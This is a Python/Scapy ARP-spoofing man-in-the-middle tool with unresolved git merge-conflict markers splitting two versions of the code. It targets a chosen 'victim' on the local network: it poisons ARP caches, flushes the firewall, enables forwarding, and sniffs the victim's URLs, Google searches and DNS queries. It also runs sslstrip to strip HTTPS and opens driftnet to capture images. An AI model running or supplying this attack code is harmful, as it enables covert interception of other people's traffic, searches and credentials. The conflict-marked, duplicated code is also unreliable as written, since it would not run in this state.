#!/usr/bin/python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb=0
<<<<<<< HEAD
#Below is necessary to receive a response to the DHCP packets for some reason
conf.checkIPaddr=0
import time
import sys
import threading
import argparse
import sys
import os
import signal
import commands
bash=commands.getoutput

#Check if root
if not os.geteuid()==0:
	sys.exit("\nPlease run as root\n")

#Create the arguments
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing", action="store_true")
parser.add_argument("-d", "--dnsspy", help="Show all DNS resquests the victim makes. This has the advantage of showing HTTPS domains which the -u option will not but does not show the full URL the victim is requesting", action="store_true")
parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning")
parser.add_argument("-i", "--driftnet", help="Open an xterm window with driftnet", action="store_true")
parser.add_argument("-g", "--google", help="Print google searches", action="store_true")
parser.add_argument("-s", "--sslstrip", help="Run sslstrip and output to sslstrip.txt", action="store_true")
=======
import time, sys
import threading
import argparse
import sys
import signal
import argparse
import commands
bash=commands.getoutput


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--urlsnarf", help="Run with urlsnarf in output", action="store_true")
parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim")
parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet", action="store_true")
>>>>>>> 7a81ddf077dfc15dc3e14b2daee51603d48b1c89
args = parser.parse_args()

#Find the gateway and use it as the router's info
routerCmd = bash('ip route')
routerRE = re.search('default via ((\d{2,3}\.\d{1,3}\.\d{1,4}\.)\d{1,3}) \w+ (\w[a-zA-Z0-9]\w[a-zA-Z0-9][0-9]?)', routerCmd)
routerIP = routerRE.group(1)
IPprefix = routerRE.group(2)
interface = routerRE.group(3)
<<<<<<< HEAD

if args.dnsspy:
	print "Checking if the router is the DNS server..."
	dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
	ans, unans = srp(dhcp_discover, timeout=5, retry=2)
	if ans:
		for p in ans:
			DNSserver = p[1][IP].src
			print "DNS server at: ", DNSserver, '\n'
	else:
		print "No answer to DHCP packet sent to find DNS server\n"

if args.ipaddress:
	victimIP = args.ipaddress
else:
	ans,unans = arping(IPprefix+'*')
	for s,r in ans:
		ips = r.sprintf("%ARP.hwsrc% %ARP.psrc%")
		print ips
	victimIP = raw_input('\nType victim\'s IP: ')

def originalMAC(ip):
	# srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=7, retry=3)
=======
driftcounter = 0

class ThreadClass(threading.Thread):
	def run(self):
		process = subprocess.Popen(['urlsnarf', '-i', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		while True:
			out = process.stdout.read(1)
			if out == '' and process.poll() != None:
				break
			if out != '':
				sys.stdout.write(out)
				sys.stdout.flush()

def originalMAC(ip):
	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5)
>>>>>>> 7a81ddf077dfc15dc3e14b2daee51603d48b1c89
	for s,r in ans:
		return r.sprintf("%Ether.src%")

def poison(routerIP, victimIP):
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff"))
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff"))

def restore(routerIP, victimIP, routerMAC, victimMAC):
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=5)
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=5)

<<<<<<< HEAD
def URL(pkt):
	if pkt.haslayer(Raw):
		request = pkt[Raw].load
		searchGET = re.compile('GET')
		get = searchGET.search(request)
		searchHost = re.compile('Host:')
		host = searchHost.search(request)
		if get and host:
			a = request.split("\r\n")
			b = a[1].split(" ")
			c = a[0].split(" ")
			url = b[1]+c[1]
			if args.urlspy:
				print url
			if args.google:
				if 'google' in url:
					r = re.findall(r'(?i)\&q=(.*?)\&', request)
					if r:
						search = r[0].split('&')[0]
						search = search.replace('q=', '').replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'')
						print '%s googled:' % victimIP, search

def DNS(pkt):
	if pkt.haslayer(DNSQR):
		dnsreq = pkt[DNSQR].qname
		print dnsreq

class urlspy(threading.Thread):
	def run(self):
		sniff(store=0, filter='port 80 and host %s' % victimIP, prn=URL, iface=interface)

class dnsspy(threading.Thread):
	def run(self):
		sniff(store=0, filter='port 53 and host %s' % victimIP, prn=DNS, iface=interface)

#class ssltrip(threading.Thread):
#	def run(self):
def sslstrip():
	print 'Redirecting traffic to port 10000 and starting sslstrip\n'
	ip10000 = bash('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
	sslstrip = bash('xterm -e sslstrip -f -w sslstrip.txt')

def main():

	#Forward packets and flush iptables
	ipforward = bash('echo 1 > /proc/sys/net/ipv4/ip_forward')
	ipF = bash('iptables -F')
	ipNATF = bash('iptables -t nat F')
	ipX = bash('iptables -X')
	ipNATX = bash('iptables -t nat -X')
=======
if args.ipaddress:
	victimIP = args.ipaddress
else:
	ans,unans = arping(IPprefix+'*')
	for s,r in ans:
		ips = r.sprintf("%ARP.psrc%")
		print ips
	victimIP = raw_input('\nType victim\'s IP: ')


def main():

	def signal_handler(signal, frame):
		print ' ...  Sending healing packets and turning off IP forwarding ...'
		restore(routerIP, victimIP, routerMAC, victimMAC)
		restore(routerIP, victimIP, routerMAC, victimMAC)
		ipforwardoff = bash('echo 0 > /proc/sys/net/ipv4/ip_forward')
		sys.exit(0)

	signal.signal(signal.SIGINT, signal_handler)

	#Forward packets and flush iptables
	ipforward = bash('echo 1 > /proc/sys/net/ipv4/ip_forward')
	bash('iptables --flush')
>>>>>>> 7a81ddf077dfc15dc3e14b2daee51603d48b1c89
	print 'Enabled IP forwarding and flushed the firewall\n'

	print "Active interface = " + interface
	print "Router IP = " + routerIP
	print "Client IP = " + victimIP

	try:
		routerMAC = originalMAC(routerIP)
		print "Router MAC: " + routerMAC
		victimMAC = originalMAC(victimIP)
		print "Victim MAC: " + victimMAC + "\n"
	except:
<<<<<<< HEAD
		sys.exit("Could not get MAC addresses")

	if args.urlspy or args.google:
		ug = urlspy()
		#Make sure the thread closes with the main program on Ctrl-C
		ug.daemon = True
		ug.start()

	if args.dnsspy:
		dt = dnsspy()
		dt.daemon = True
		dt.start()

	if args.driftnet:
		time.sleep(5)
		driftnet = bash('xterm -e driftnet -i %s' % interface)

	if args.sslstrip:
		sslstrip()

	def signal_handler(signal, frame):
		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
		restore(routerIP, victimIP, routerMAC, victimMAC)
		restore(routerIP, victimIP, routerMAC, victimMAC)
		ipforwardoff = bash('echo 0 > /proc/sys/net/ipv4/ip_forward')
		flush = bash('iptables -t nat -F')
		sys.exit(0)

	signal.signal(signal.SIGINT, signal_handler)

=======
		try:
			print "Didn't recieve a reply; trying again..."
			routerMAC = originalMAC(routerIP)
			print "Router MAC: " + routerMAC
			victimMAC = originalMAC(victimIP)
			print "Victim MAC: " + victimMAC + "\n"
		except:
			try:
				print "Didn't recieve a reply; trying again..."
				routerMAC = originalMAC(routerIP)
				print "Router MAC: " + routerMAC
				victimMAC = originalMAC(victimIP)
				print "Victim MAC: " + victimMAC + "\n"
			except:
				sys.exit("Could not get MAC addresses")

	if args.urlsnarf:
		time.sleep(10)
		t=ThreadClass()
		t.start()

	if args.driftnet:
		time.sleep(10)
		driftnet = bash('xterm -e driftnet -i %s ' % interface)
>>>>>>> 7a81ddf077dfc15dc3e14b2daee51603d48b1c89

	while 1:

		poison(routerIP, victimIP)
<<<<<<< HEAD
		try:
			if DNSserver != routerIP:
				poison(DNSserver, victimIP)
		except Exception:
			pass
		time.sleep(4)

=======
		if driftcounter < 1:
			if args.driftnet:
				driftnet = bash('xterm -e driftnet -i %s ' % interface)
				driftcounter = 1
		time.sleep(2)
>>>>>>> 7a81ddf077dfc15dc3e14b2daee51603d48b1c89

if __name__ == "__main__":
	main()